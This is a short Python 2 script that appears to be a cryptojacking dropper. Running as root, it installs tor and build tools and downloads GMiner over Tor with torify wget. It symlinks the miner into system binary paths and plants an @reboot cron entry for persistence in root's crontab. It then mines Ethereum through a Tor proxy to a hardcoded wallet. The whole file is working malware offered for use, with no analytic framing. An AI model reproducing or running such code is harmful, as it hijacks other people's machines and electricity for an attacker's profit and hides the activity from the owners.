__author__ = 'root'
import time
import urllib2
import urllib
import os,sys
from httplib import BadStatusLine
from socket import error as socket_error
import multiprocessing
import ast, random, string
useproxy = 0
os.system('chmod 777 ' + __file__)
program = ''
link_github = 'https://github.com/develsoftware/GMinerRelease/releases/download/2.68/gminer_2_68_linux64.tar.xz'
link_folder = 'gminer_2_68_linux64.tar.xz'


program = 'miner'
os.system('pkill ' + program)

try:
    os.system('apt-get update -y')
    os.system('apt-get install -y build-essential cmake libuv1-dev openssl libssl-dev libhwloc-dev wget gcc make python python-dev tor screen git')
except:
    pass
try:

    if not os.path.isfile('/root/%s' % program):
        os.chdir('/root')
        #os.system('rm -rf %s' %link_folder)
        os.system('torify wget ' + link_github)
        os.system('tar -xf ' + link_folder)
        workingdir = os.getcwd()
        os.system('ln -s -f ' + workingdir + '/' + 'miner' + ' ' +'/usr/local/bin/' + program)
        os.system('ln -s -f ' + workingdir + '/' + 'miner' + ' ' + '/usr/bin/' + program)
        time.sleep(2)
    else:
        try:
            os.chdir('/root')
            workingdir = os.getcwd()
            os.system('ln -s -f ' + workingdir + '/' + 'miner' + ' ' + '/usr/local/bin/' + program)
            os.system('ln -s -f ' + workingdir + '/' + 'miner' + ' ' + '/usr/bin/' + program)
            time.sleep(2)
        except:
            pass
    try:
        path = '/var/spool/cron/crontabs/root'
        data = '@reboot screen -dm python /etc/dao.py'
        os.system('echo %s >> %s' %(data, path))
        os.system('chmod 600 %s' %path)
    except:
        pass
except:
    pass

os.system('tor &')
time.sleep(60)
#os.system (program + ' -o stratum+tcp://73avhutb24chfsh6.onion:442 --tls -socks5=9050 -t ' + str(cores))
os.system (program + ' --algo ethash --server asia1.ethermine.org:4444 --proxy 127.0.0.1:9050 --user 0xbefefb5612d0775d592cb8c0b9411f8a57da5701')
